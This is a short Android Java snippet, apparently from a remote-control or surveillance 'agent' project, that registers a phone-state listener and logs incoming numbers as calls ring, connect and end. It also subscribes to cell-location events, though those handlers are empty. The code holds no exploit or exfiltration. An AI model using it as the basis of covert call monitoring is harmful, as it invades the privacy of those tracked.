package com.ht.RCSAndroidGUI.agent.call;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.CellLocation;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

//SNIPPET
public class PhoneListener extends Activity {
	TextView tv1;
	TelephonyManager telManager;

	@Override
	public void onCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		telManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		telManager.listen(new TelListener(),
				PhoneStateListener.LISTEN_CALL_FORWARDING_INDICATOR
						| PhoneStateListener.LISTEN_CALL_STATE
						| PhoneStateListener.LISTEN_CELL_LOCATION
						| PhoneStateListener.LISTEN_DATA_ACTIVITY
						| PhoneStateListener.LISTEN_DATA_CONNECTION_STATE
						| PhoneStateListener.LISTEN_MESSAGE_WAITING_INDICATOR
						| PhoneStateListener.LISTEN_SERVICE_STATE
						| PhoneStateListener.LISTEN_SIGNAL_STRENGTH);
	}

	private class TelListener extends PhoneStateListener {
		@Override
		public void onCallStateChanged(final int state,
				final String incomingNumber) {
			super.onCallStateChanged(state, incomingNumber);

			Log.v("Phone State", "state:" + state);
			switch (state) {

			case TelephonyManager.CALL_STATE_IDLE:
				Log.v("Phone State", "incomingNumber:" + incomingNumber
						+ " ended");
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK:
				Log.v("Phone State", "incomingNumber:" + incomingNumber
						+ " picked up");
				break;
			case TelephonyManager.CALL_STATE_RINGING:
				Log.v("Phone State", "incomingNumber:" + incomingNumber
						+ " received");
				break;
			default:
				break;
			}
		}

		@Override
		public void onCallForwardingIndicatorChanged(final boolean cfi) {
		};

		@Override
		public void onCellLocationChanged(final CellLocation location) {
		};

		@Override
		public void onDataActivity(final int direction) {
		};

		@Override
		public void onDataConnectionStateChanged(final int state) {
		};

		@Override
		public void onMessageWaitingIndicatorChanged(final boolean mwi) {
		};

		@Override
		public void onServiceStateChanged(final ServiceState serviceState) {
		};

		@Override
		public void onSignalStrengthChanged(final int asu) {
		};
	}
}
